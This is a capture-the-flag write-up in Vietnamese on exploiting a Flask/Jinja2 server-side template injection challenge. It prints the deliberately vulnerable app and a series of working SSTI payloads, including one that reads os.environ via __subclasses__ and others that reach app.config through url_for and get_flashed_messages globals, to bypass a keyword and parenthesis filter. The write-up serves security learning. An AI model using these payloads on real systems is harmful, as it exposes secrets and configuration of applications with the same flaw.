![image](https://github.com/Llam-a/BUUCTF/assets/115911041/10e67e4b-53b1-4afa-9432-85e142d3cf46)Ta format lại code của bài

```python
import flask
import os
  
app = flask.Flask(__name__)
  
app.config['FLAG'] = os.environ.pop('FLAG')
  
@app.route('/')
def index():
    return open(__file__).read()
  
@app.route('/shrine/<path:shrine>')
def shrine(shrine):
  
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
  
    return flask.render_template_string(safe_jinja(shrine))
  
if __name__ == '__main__':
    app.run(debug=True)
```

Có thể thấy có 2 routes, route đầu tiên là source code hiện tại, route thứ hai là sumbit tham số dưới path, `@app.route('/shrine/<path:shrine>')` ---> Input của ta nằm ở /shrine/.

Thử test với `{{7*7}}`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/9b1ab8aa-5cb1-470d-beea-406d8ea5ac4b)

`s = s.replace('(', '').replace(')', '')` ⇒ `(` `)` sẽ bị xóa

`blacklist = ['config', 'self']` ⇒ `config`, `self` sẽ bị xóa

Và nó cũng auto thêm {% set config=None%}{% set self=None%} vào trước payload.

`return flask.render_template_string(safe_jinja(shrine))` ⇒Vulnerability is SSTI by Jinja2 (Server Side Template Injection).

Goal của ta là lấy được flag: `app.config['FLAG'] = os.environ.pop('FLAG')`.Nhưng mà đã bị filter mất `config` nên k thể xem app.config.

Nếu ta ko bị filter `self` và `config` thì thường có thể dùng:
`url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config`

Hoặc k bị filter `(`,  `)`

`{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG]}}`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/1dc5b88f-8469-4899-86da-600dc88a0306)

Mình research xem có thê dùng cách nào để thay thế `config` và `shelf`.Sau khi đọc docs thì python có built-in function aka tính năng cái sẵn.Thay vì ta cần config, ta có thể access config từ global variable(current_app).Ví dụ:

`__globals__['current_app'].config['FLAG]`

`top.app.config['FLAG']`

------- SOLVE

`{{url_for.__globals__}}`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/3b387300-0db7-41db-a713-02f5d8ce270d)

Vậy nó là current app. Ta có thể config từ đó

`{{url_for.__globals__['current_app'].config}}`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/116aa7d8-ebb0-4a30-a2e1-5c151c936cf5)

Hoặc ta có thể dùng `get_flashed_messages`

Nó sẽ return flashed messages từ session và trả về chúng dưới dạng một danh sách

`{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}`

